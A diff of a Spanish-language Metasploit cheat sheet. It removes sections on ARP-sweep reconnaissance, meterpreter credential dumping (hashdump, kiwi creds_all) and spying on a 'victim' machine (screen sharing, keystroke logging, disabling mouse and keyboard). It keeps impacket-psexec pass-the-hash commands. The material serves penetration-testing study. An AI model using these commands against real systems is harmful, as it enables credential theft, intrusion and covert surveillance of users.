@@ -126,18 +126,6 @@ Verificar la DB del Metasploit y después entrar (Cuando se ejecuta por primera 
 ❯ search cve:2017 type:exploit platform:-windows # Buscar un CVE de una SO especifico
 ```
 
-## Aplicas un reconocimiento en la red local con ARP 
-
-```bash 
-❯ use auxiliary/scanner/discovery/arp_sweep      # Para usar el exploit
-❯ options                                        # Miramos las opciones del exploit y ver lo que es necesario cargar para hacer el barrido en la subred
-❯ info 'o' info -d                               # Nos da una breve descripcion de lo que hace el exploit
-❯ set RHOSTS 192.168.68.0/24                     # Colocamos la subred en donde queremos hacer el barrido del ARP
-❯ run
-❯ hosts                                          # Nos muestra los hosts que ha descubierto en el reconocimiento
-❯ services                                       # Nos muestra los servicios, pero para que sea mas efectivo, debemos de pasarle el archivo XML de Nmap
-```
-
 ```bash 
 ❯ use ❮Number or path❯       # Colocamos el numero del exploit que vamos a usar
 ❯ back                       # Nos salimos del exploit o auxiliar que hemos elegido 
@@ -160,44 +148,12 @@ Verificar la DB del Metasploit y después entrar (Cuando se ejecuta por primera 
 ❯ sessions -u <ID>           # Regresamos a la sesion 
 ```
 
-## Comandos específicos 
-
-Dentro de la maquina podemos hacer algunos comandos específicos
-```bash 
-❯ shell                      # Nos carga una shell
-❯ load powershell            # Cargamos el modulo powershell
-❯ powershell_shell           # Nos carga una powershell 
-❯ getuid                     # Nos muestra el nombre del servidor o usuario en Windows  
-❯ sysinfo                    # Nos muestra algunos detalles del servidor, arquitectura, SO, etc...
-❯ ps                         # Mirar los procesos existentes
-❯ hashdump                   # Para dumpear los hashes del sistema, crackearlos y hacer pass-the-hash
-❯ load kiwi                  # Cargamos el modulo kiwi para poder usar 'creds_all'
-❯ creds_all                  # Recopila informacion de credenciales de todo tipo
-```
-
 ## Usar Psexec
 
 ```bash 
 ❯ impacket-psexec WORKGROUP/omar@<IP Victima> -hashes :3ebi487y598ongyn98g56yng389yr6d6u  # Podemos hacer pass the hash y ser nt authority\system
 ❯ impacket-psexec WORKGROUP/omar:<Password>@<IP Victima>                                  # Podemos usar la passwd para entrar y ser nt authority\system
 ```
-
-## Comandos de Metasploit dentro de la maquina victima.
-
-```bash 
-❯ help                       # Miramos el panel de ayuda
-❯ screenshot                 # Captura de pantalla del equipo
-❯ load espia                 # Cargamos el modulo 'espia' y asi poder usar el 'screengrab, screenshare'
-❯ screenshare                # Mirar el escritorio del usuario remoto en tiempo real 
-❯ uictl disable <mouse>      # Podemos desabilitar (disable, enable) algunos componentes de interface de la maquina victima como: mouse, keyboard, all 
-❯ keyscan_start              # Sniffer de pulsaciones del teclado
-❯ keyscan_dump               # Nos muestra lo que capturo por el teclado con el comando anterior
-❯ keyscan_stop               # Para el sniffer de pulsaciones del teclado
-❯ background                 # Ponemos la sesion en segundo plano 
-❯ sessions                   # Miramos las sesiones activas en segundo plano 
-❯ sessions <id>              # Migras a alguna sesion que tenemos en segundo plano
-```
-
 
 ## Persistencia 
 
